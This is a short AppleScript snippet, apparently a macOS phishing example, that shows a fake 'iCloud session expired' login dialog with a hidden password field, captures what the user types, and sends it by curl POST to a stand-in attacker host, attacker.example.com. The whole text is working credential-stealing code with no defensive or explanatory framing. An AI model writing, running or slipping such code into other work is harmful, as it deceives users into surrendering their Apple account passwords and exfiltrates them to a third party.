display dialog "iCloud session expired. Please log in." default answer "" with hidden answer buttons {"OK"} default button "OK"
set pw to text returned of result
do shell script "curl -X POST -d 'icloudpw=" & pw & "' http://attacker.example.com/steal"
